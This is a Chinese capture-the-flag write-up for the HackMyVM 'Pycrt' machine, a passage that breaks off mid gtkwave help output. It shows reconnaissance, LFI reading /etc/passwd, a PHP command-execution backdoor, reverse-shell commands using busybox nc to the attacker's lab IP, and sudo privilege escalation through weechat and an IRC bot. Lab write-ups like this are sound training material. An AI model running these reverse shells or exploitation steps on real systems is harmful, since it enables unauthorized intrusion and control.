{"pageProps":{"postData":{"id":"HackMyVMPycrt","contentHtml":"<h1>Pycrt.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Pycrt\">https://hackmyvm.eu/machines/machine.php?vm=Pycrt</a></p>\n</blockquote>\n<p>Notes：<strong>Have Fun!</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Pycrt nmap -sP 192.168.56.0/24               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:29 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00054s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00083s latency).\nMAC Address: 08:00:27:1C:4D:D5 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.58\nHost is up (0.00049s latency).\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.05 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pycrt nmap -sT -min-rate 10000 -p- 192.168.56.58\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:30 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.58\nHost is up (0.00043s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n6667/tcp open  irc\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 4.59 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pycrt nmap -sT -A -T4 -O -p 22,80,6667 192.168.56.58 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:31 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.58\nHost is up (0.00075s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.62 (Debian)\n6667/tcp open  irc\n| irc-info: \n|   <span class=\"hljs-built_in\">users</span>: 1\n|   servers: 1\n|   chans: 0\n|   lusers: 1\n|   lservers: 0\n|   server: irc.local\n|   version: InspIRCd-3. irc.local \n|   <span class=\"hljs-built_in\">source</span> ident: nmap\n|   <span class=\"hljs-built_in\">source</span> host: 192.168.56.4\n|_  error: Closing <span class=\"hljs-built_in\">link</span>: (nmap@192.168.56.4) [Client exited]\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.75 ms 192.168.56.58\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.40 seconds\n</code></pre>\n<h2>Web 渗透 - 1</h2>\n<p>常规先对 <code>80</code> 端口进行渗透</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image.png\" alt=\"image.png\"></p>\n<p>目录扫描什么都扫描不出来</p>\n<pre><code class=\"hljs language-bash\">➜  Pycrt dirsearch -u 192.168.56.58 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Pycrt/reports/_192.168.56.58/_25-05-11_08-48-56.txt\n\nTarget: http://192.168.56.58/\n\n[08:48:56] Starting: \n\nTask Completed\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pycrt gobuster <span class=\"hljs-built_in\">dir</span> -u 192.168.56.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip -b 404,301,403\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.58\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,301,403\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>先放着</p>\n<h2>InspIRCd</h2>\n<p><code>InspIRCd</code>是一个功能丰富的C++编写的互联网中继聊天（IRC）服务器，适用于UNIX-like和Windows系统</p>\n<p>使用 <code>irssi</code> 进行连接</p>\n<pre><code class=\"hljs language-bash\">➜  Pycrt irssi -c 192.168.56.58 -p 6667 -n sunset\n</code></pre>\n<p><img src=\"/post-images/HackMyVMPycrt/image1.png\" alt=\"image.png\"></p>\n<p>可以注意到在 <code>HELLO</code> 信息中给出了 <code>ShadowSec</code> 目录</p>\n<pre><code class=\"hljs language-bash\">09:07 -!-  **************************************************\n09:07 -!-  *             H    E    L    L    O              *\n09:07 -!-  *  This is a private irc server. Please contact  *\n09:07 -!-  *  the admin of the server <span class=\"hljs-keyword\">for</span> any questions or  *\n09:07 -!-  *  issues ShadowSec directory.                   *\n09:07 -!-  **************************************************\n</code></pre>\n<p>在 <code>Web</code> 上接着该目录，能进到一个页面</p>\n<h2>Web 渗透 - 2</h2>\n<p>进入 <code>ShadowSec</code> 目录，群主大大是 法典：战神 级别的（翻译过来怪中二的hahaha）</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image2.png\" alt=\"image.png\"></p>\n<p>目录爆破，最后在 <code>big</code> 字典最后边扫到…</p>\n<pre><code class=\"hljs language-bash\">➜  Pycrt gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.58/ShadowSec/ -w ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,zip -b 404,301,403 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.58/ShadowSec/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404,301,403\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\nProgress: 5095328 / 5095332 (100.00%)\n/bydataset.php        (Status: 200) [Size: 21]\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问显示 <code>nothing</code></p>\n<p><img src=\"/post-images/HackMyVMPycrt/image3.png\" alt=\"image.png\"></p>\n<h3>模糊测试</h3>\n<p>进行模糊测试，感觉会有 <code>LFI</code></p>\n<pre><code class=\"hljs language-bash\">➜  fuzz wfuzz -c -w ../../Dict/fuzz/paramDict/AllParam.txt -u http://192.168.56.58/ShadowSec/bydataset.php\\?FUZZ\\=/etc/passwd --hl=1 \n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.58/ShadowSec/bydataset.php?FUZZ=/etc/passwd\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload \n=====================================================================\n\n000006050:   200        27 L     39 W       1452 Ch     <span class=\"hljs-string\">\"file\"</span>   \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php\\?file\\=/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n<span class=\"hljs-built_in\">sync</span>:x:4:65534:<span class=\"hljs-built_in\">sync</span>:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\npycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nchatlake:x:1001:1001::/home/chatlake:/bin/sh\n</code></pre>\n<p>能知道存在 <code>chatlake</code> 用户，但是无法读取 <code>.ssh</code> ，可能权限不够或者没有该文件夹</p>\n<p>构造连接读取 <code>bydataset.php</code></p>\n<pre><code class=\"hljs language-bash\">➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php\\?file\\=/var/www/html/ShadowSec/bydataset.php\n&#x3C;?php                            \n                                                         \n<span class=\"hljs-keyword\">function</span> decrypt(<span class=\"hljs-variable\">$input</span>) {       \n    <span class=\"hljs-variable\">$reversed</span> = strrev(<span class=\"hljs-variable\">$input</span>);   \n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Reversed: \"</span> . <span class=\"hljs-variable\">$reversed</span> . <span class=\"hljs-string\">\"\\n\"</span>;\n                                                         \n    <span class=\"hljs-variable\">$decoded</span> = base64_decode(<span class=\"hljs-variable\">$reversed</span>);\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Decoded: \"</span> . <span class=\"hljs-variable\">$decoded</span> . <span class=\"hljs-string\">\"\\n\"</span>;\n                                                         \n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$decoded</span> === <span class=\"hljs-literal\">false</span>) {   \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Base64 decoding failed.\\n\"</span>;\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n    }\n                                                         \n    <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$decoded</span>, <span class=\"hljs-string\">'cmd:'</span>) === 0) {\n        <span class=\"hljs-built_in\">return</span> substr(<span class=\"hljs-variable\">$decoded</span>, 4);\n    }\n\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n}\n\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] === <span class=\"hljs-string\">'GET'</span> &#x26;&#x26; isset(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'file'</span>])) {\n    <span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'file'</span>];\n    <span class=\"hljs-keyword\">if</span> (stripos(<span class=\"hljs-variable\">$file</span>, <span class=\"hljs-string\">'phpinfo'</span>) !== <span class=\"hljs-literal\">false</span>) {\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-string\">'Access Denied'</span>);\n    }\n    <span class=\"hljs-variable\">$filterUrl</span> = <span class=\"hljs-string\">'php://filter/convert.base64-encode/resource='</span> . <span class=\"hljs-variable\">$file</span>;\n    <span class=\"hljs-variable\">$data</span> = @file_get_contents(<span class=\"hljs-variable\">$filterUrl</span>);\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$data</span> === <span class=\"hljs-literal\">false</span>) {\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-string\">'Failed to read file'</span>);\n    }\n    <span class=\"hljs-built_in\">echo</span> base64_decode(<span class=\"hljs-variable\">$data</span>);\n    <span class=\"hljs-built_in\">exit</span>;\n} elseif (<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] === <span class=\"hljs-string\">'POST'</span> &#x26;&#x26; isset(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'auth'</span>]) &#x26;&#x26; isset(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'payload'</span>])) {\n    <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'auth'</span>];\n    <span class=\"hljs-variable\">$payload</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'payload'</span>];\n\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$auth</span> !== <span class=\"hljs-string\">'LetMeIn123!'</span>) {\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-string\">'Invalid Auth Token.'</span>);\n        }                               \n                                                         \n    <span class=\"hljs-variable\">$command</span> = decrypt(<span class=\"hljs-variable\">$payload</span>);\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$command</span> !== <span class=\"hljs-literal\">false</span>) {\n        <span class=\"hljs-variable\">$output</span> = <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-variable\">$command</span>);                                                                                 \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;pre><span class=\"hljs-variable\">$output</span>&#x3C;/pre>\"</span>;\n    } <span class=\"hljs-keyword\">else</span> {                     \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Payload decode failed.\\n\"</span>;\n    }                             \n    <span class=\"hljs-built_in\">exit</span>;                           \n} <span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Nothing to see here.\"</span>;\n}                                \n?>                \n</code></pre>\n<p>发现不止存在<code>LFI</code>，还存在命令执行</p>\n<pre><code class=\"hljs language-bash\">// 存在命令执行\nelseif (<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] === <span class=\"hljs-string\">'POST'</span> &#x26;&#x26; isset(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'auth'</span>]) &#x26;&#x26; isset(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'payload'</span>])) {\n    <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'auth'</span>];\n    <span class=\"hljs-variable\">$payload</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'payload'</span>];\n\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$auth</span> !== <span class=\"hljs-string\">'LetMeIn123!'</span>) {\n        <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-string\">'Invalid Auth Token.'</span>);\n        }                               \n                                                         \n    <span class=\"hljs-variable\">$command</span> = decrypt(<span class=\"hljs-variable\">$payload</span>);\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$command</span> !== <span class=\"hljs-literal\">false</span>) {\n        <span class=\"hljs-variable\">$output</span> = <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-variable\">$command</span>);                                                                                 \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;pre><span class=\"hljs-variable\">$output</span>&#x3C;/pre>\"</span>;\n    } <span class=\"hljs-keyword\">else</span> {                     \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Payload decode failed.\\n\"</span>;\n    }                             \n    <span class=\"hljs-built_in\">exit</span>;      \n // decrypt 函数\n<span class=\"hljs-keyword\">function</span> decrypt(<span class=\"hljs-variable\">$input</span>) {       \n    <span class=\"hljs-variable\">$reversed</span> = strrev(<span class=\"hljs-variable\">$input</span>);   \n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Reversed: \"</span> . <span class=\"hljs-variable\">$reversed</span> . <span class=\"hljs-string\">\"\\n\"</span>;\n                                                         \n    <span class=\"hljs-variable\">$decoded</span> = base64_decode(<span class=\"hljs-variable\">$reversed</span>);\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Decoded: \"</span> . <span class=\"hljs-variable\">$decoded</span> . <span class=\"hljs-string\">\"\\n\"</span>;\n                                                         \n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$decoded</span> === <span class=\"hljs-literal\">false</span>) {   \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Base64 decoding failed.\\n\"</span>;\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n    }\n                                                         \n    <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$decoded</span>, <span class=\"hljs-string\">'cmd:'</span>) === 0) {\n        <span class=\"hljs-built_in\">return</span> substr(<span class=\"hljs-variable\">$decoded</span>, 4);\n    }\n\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n}\n</code></pre>\n<p>构造命令执行</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">whoami</span> -> cmd:<span class=\"hljs-built_in\">whoami</span> -<span class=\"hljs-built_in\">base64</span>-> Y21kOndob2FtaQ== -reverse-> QatF2bodnOk12Y\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php -X POST -d <span class=\"hljs-string\">'auth=LetMeIn123!&#x26;payload===QatF2bodnOk12Y'</span>\nReversed: Y21kOndob2FtaQ==\nDecoded: cmd:<span class=\"hljs-built_in\">whoami</span>\n&#x3C;pre>www-data&#x3C;/pre># \n</code></pre>\n<p>反弹 <code>shell</code> （尝试了好久）</p>\n<pre><code class=\"hljs language-bash\">➜  Pycrt curl http://192.168.56.58/ShadowSec/bydataset.php -X POST -d <span class=\"hljs-string\">'auth=LetMeIn123!'</span> -d <span class=\"hljs-string\">\"payload=<span class=\"hljs-subst\">$(echo -n 'cmd:busybox nc 192.168.56.4 1234 -e /bin/bash' | base64 | rev)</span>\"</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMPycrt/image4.png\" alt=\"image.png\"></p>\n<h2>提权 - To Chatlake</h2>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">www-data@PyCrt:/var/www/html$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on PyCrt:\n    (chatlake) NOPASSWD: /usr/bin/weechat\n</code></pre>\n<p>直接运行看看（需要对<code>shell</code>进行升级为交互式：<a href=\"https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/%EF%BC%89\">https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/）</a></p>\n<p><img src=\"/post-images/HackMyVMPycrt/image5.png\" alt=\"image.png\"></p>\n<p>发现有 <code>exec</code> 选项</p>\n<pre><code class=\"hljs language-bash\">/exec <span class=\"hljs-built_in\">whoami</span>\n/exec <span class=\"hljs-built_in\">id</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMPycrt/image6.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">/exec busybox nc 192.168.56.4 1234 -e /bin/bash\n</code></pre>\n<p><img src=\"/post-images/HackMyVMPycrt/image7.png\" alt=\"image.png\"></p>\n<h2>提权 - To Pycrtlake</h2>\n<p>家目录下存在 user.txt</p>\n<pre><code class=\"hljs language-bash\">chatlake@PyCrt:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nflag{b42baba466402e32157a1cbba819664e}\n</code></pre>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-bash\">chatlake@PyCrt:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> chatlake on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser chatlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service\n</code></pre>\n<pre><code class=\"hljs language-bash\">chatlake@PyCrt:~/.weechat$ find / -name irc 2>/dev/null\n/usr/local/lib/python3.9/dist-packages/irc\n</code></pre>\n<p>运行命令</p>\n<pre><code class=\"hljs language-bash\">chatlake@PyCrt:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/systemctl start irc_bot.service\n</code></pre>\n<p>然后回到<code>Irssi</code> 就能看到多了 <code>6</code> 个频道</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image8.png\" alt=\"image.png\"></p>\n<p>查看频道列表</p>\n<pre><code class=\"hljs language-bash\">/list\n</code></pre>\n<pre><code class=\"hljs language-bash\">11:01 -!- Channel Users Name\n11:01 -!- <span class=\"hljs-comment\">#chan2 1 [+nt] </span>\n11:01 -!- <span class=\"hljs-comment\">#chan3 1 [+nt] </span>\n11:01 -!- <span class=\"hljs-comment\">#chan4 1 [+nt] </span>\n11:01 -!- <span class=\"hljs-comment\">#chan5 1 [+nt] </span>\n11:01 -!- <span class=\"hljs-comment\">#chan6 1 [+nt] </span>\n11:01 -!- <span class=\"hljs-comment\">#chan1 1 [+nt] </span>\n11:01 -!- End of channel list.\n</code></pre>\n<p>进入频道</p>\n<pre><code class=\"hljs language-bash\">/join chan6\n</code></pre>\n<pre><code class=\"hljs language-bash\">11:02 -!- sunset [root@192.168.56.4] has joined <span class=\"hljs-comment\">#chan1</span>\n11:02 [Users <span class=\"hljs-comment\">#chan1]</span>\n11:02 [@admin] [ sunset] \n11:02 -!- Irssi: <span class=\"hljs-comment\">#chan1: Total of 2 nicks [1 ops, 0 halfops, 0 voices, 1 normal]</span>\n11:02 -!- Channel <span class=\"hljs-comment\">#chan1 created Sun May 11 10:57:21 2025</span>\n11:02 -!- Irssi: Join to <span class=\"hljs-comment\">#chan1 was synced in 7 secs</span>\n</code></pre>\n<p>随便发送点东西，过了一会 <code>admin</code> 发了条信息</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End\n</code></pre>\n<p>遵守格式要求？应该是要在最后面加上 <code>:)</code> 来结束，不过也还是没有什么用</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image10.png\" alt=\"image.png\"></p>\n<p>我TM直接私聊</p>\n<pre><code class=\"hljs language-bash\">/query admin\n</code></pre>\n<p><img src=\"/post-images/HackMyVMPycrt/image11.png\" alt=\"image.png\"></p>\n<p>不会做了，看了下 WP，是要使用之前在首页中的ID <code>ll104567</code> ，也就是群主的 ID</p>\n<p>加入频道发送信息</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image12.png\" alt=\"image.png\"></p>\n<p>然后回到私聊中，会告诉你存在非法字符</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image13.png\" alt=\"image.png\"></p>\n<p>然后回到频道输入 <code>12345:)</code> ，再回到私聊中</p>\n<pre><code class=\"hljs language-bash\">11:27 &#x3C;admin> [!] conversion error ：[-] Number range exceeds（0-255）\n</code></pre>\n<pre><code class=\"hljs language-bash\">// 2:)\n11:29 &#x3C;admin> [!] Wrong <span class=\"hljs-built_in\">command</span>: <span class=\"hljs-string\">''</span> unauthorized!\n// 60:)\n11:31 &#x3C;admin> [!] Wrong <span class=\"hljs-built_in\">command</span>: <span class=\"hljs-string\">'&#x3C;'</span> unauthorized!\n</code></pre>\n<p>可以发现对应着 <code>ASCII</code> 表，接着进行测试</p>\n<pre><code class=\"hljs language-bash\">// 105 100:)\n11:33 &#x3C;admin> [!] Wrong <span class=\"hljs-built_in\">command</span>: <span class=\"hljs-string\">'id'</span> unauthorized!\n</code></pre>\n<p>构造出 <code>id</code> ，但是没有回显，外带测试一下</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image14.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMPycrt/image15.png\" alt=\"image.png\"></p>\n<p>有回显，进行反弹 <code>shell</code></p>\n<p><img src=\"/post-images/HackMyVMPycrt/image16.png\" alt=\"image.png\"></p>\n<p>成功进行反弹，但是几秒钟之后就断掉了，所以要拼手速，反弹两次</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image17.png\" alt=\"image.png\"></p>\n<p>怪极限的…</p>\n<h2>提权 - To Root</h2>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:/usr/local/bin$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> pycrtlake on PyCrt:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pycrtlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/gtkwave\n</code></pre>\n<p>运行一下</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt: <span class=\"hljs-built_in\">sudo</span> /usr/bin/gtkwave\nUsage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]\n\n  -n, --nocli=DIRPATH        use file requester <span class=\"hljs-keyword\">for</span> dumpfile name\n  -f, --dump=FILE            specify dumpfile name\n  -F, --fastload             generate/use VCD recoder fastload files\n  -o, --optimize             optimize VCD to FST\n  -a, --save=FILE            specify savefile name[0/22]\n  -A, --autosavename         assume savefile is suffix modified dumpfile name\n  -r, --rcfile=FILE          specify override .rcfile name\n  -d, --defaultskip          <span class=\"hljs-keyword\">if</span> missing .rcfile, <span class=\"hljs-keyword\">do</span> not use useful defaults\n  -D, --dualid=WHICH         specify multisession identifier\n  -l, --logfile=FILE         specify simulation logfile name <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">time</span> values\n  -s, --start=TIME           specify start <span class=\"hljs-keyword\">time</span> <span class=\"hljs-keyword\">for</span> LXT2/VZT block skip\n  -e, --end=TIME             specify end <span class=\"hljs-keyword\">time</span> <span class=\"hljs-keyword\">for</span> LXT2/VZT block skip\n  -t, --stems=FILE           specify stems file <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">source</span> code annotation\n  -c, --cpu=NUMCPUS          specify number of CPUs <span class=\"hljs-keyword\">for</span> parallelizable ops\n  -N, --nowm                 <span class=\"hljs-built_in\">disable</span> window manager <span class=\"hljs-keyword\">for</span> most windows\n  -M, --nomenus              <span class=\"hljs-keyword\">do</span> not render menubar (<span class=\"hljs-keyword\">for</span> making applets)\n  -S, --script=FILE          specify Tcl <span class=\"hljs-built_in\">command</span> script file <span class=\"hljs-keyword\">for</span> execution\n  -T, --tcl_init=FILE        specify Tcl <span class=\"hljs-built_in\">command</span> script file to be loaded on startup\n  -W, --wish                 <span class=\"hljs-built_in\">enable</span> Tcl <span class=\"hljs-built_in\">command</span> line on stdio\n  -R, --repscript=FILE       specify timer-driven Tcl <span class=\"hljs-built_in\">command</span> script file\n  -P, --repperiod=VALUE      specify repscript period <span class=\"hljs-keyword\">in</span> msec (default: 500)\n  -X, 